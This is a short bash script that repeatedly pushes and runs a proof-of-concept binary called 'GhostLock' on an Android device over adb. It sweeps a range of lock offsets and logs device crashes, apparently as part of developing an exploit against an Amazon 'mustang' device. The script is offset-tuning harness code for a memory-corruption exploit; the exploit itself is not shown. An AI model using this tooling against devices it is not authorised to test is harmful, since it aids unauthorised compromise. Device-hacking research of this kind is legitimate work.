#!/usr/bin/env bash
# GhostLock offset sweep for mustang
# Usage: sweep.sh <start_hex> <end_hex>
ADB="nix-shell -p android-tools --run"
START=${1:-0x18}
END=${2:-0x58}
RESULTS=~/dev/amazon-mustang-hack/sweep_results.txt

$ADB 'adb push /tmp/opencode/poc/gl2 /data/local/tmp/gl2 >/dev/null && adb shell chmod 755 /data/local/tmp/gl2'

for OFF in $(seq $((START)) 4 $((END))); do
  HEX=$(printf "0x%02x" $OFF)
  echo "=== PROBE $HEX ===" | tee -a $RESULTS
  $ADB "adb shell 'rm -f /data/local/tmp/gl.trace; GL_LOCKOFF=$HEX nohup /data/local/tmp/gl2 > /dev/null 2>&1 < /dev/null &'" 2>/dev/null
  sleep 9
  STATE=$($ADB 'adb get-state' 2>/dev/null)
  sleep 1
  if [ "$STATE" != "device" ]; then
    echo "$HEX: DEVICE DIED (crash)" | tee -a $RESULTS
    $ADB 'adb wait-for-device' 2>/dev/null
    sleep 8
  fi
  TRACE=$($ADB 'adb shell cat /data/local/tmp/gl.trace 2>/dev/null' 2>/dev/null | tail -1)
  echo "$HEX: last-trace: $TRACE" | tee -a $RESULTS
  LASTCRASH=$($ADB 'adb shell cat /proc/uptime' 2>/dev/null | cut -d. -f1)
  echo "$HEX: uptime: $LASTCRASH" | tee -a $RESULTS
done
echo "SWEEP DONE" | tee -a $RESULTS
